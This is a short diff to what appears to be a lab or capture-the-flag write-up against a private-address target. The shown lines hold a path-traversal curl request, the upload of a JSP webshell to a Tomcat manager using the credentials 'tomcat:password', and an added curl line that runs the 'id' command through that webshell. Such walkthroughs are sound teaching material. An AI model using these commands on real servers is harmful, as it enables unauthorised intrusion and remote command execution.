@@ -21,4 +21,7 @@ curl --path-as-is 'http://10.10.61.142:8888/../../../../../../../../../../../../
 ```bash
  curl --upload-file webshell.war -u tomcat:password 'http://10.10.61.142:8080/manager/text/deploy?path=/webshell&update=true' 
 OK - Deployed application at context path [/webshell]
+
+ curl -s 'http://10.10.61.142:8080/webshell/index.jsp?cmd=id'
+
 ```
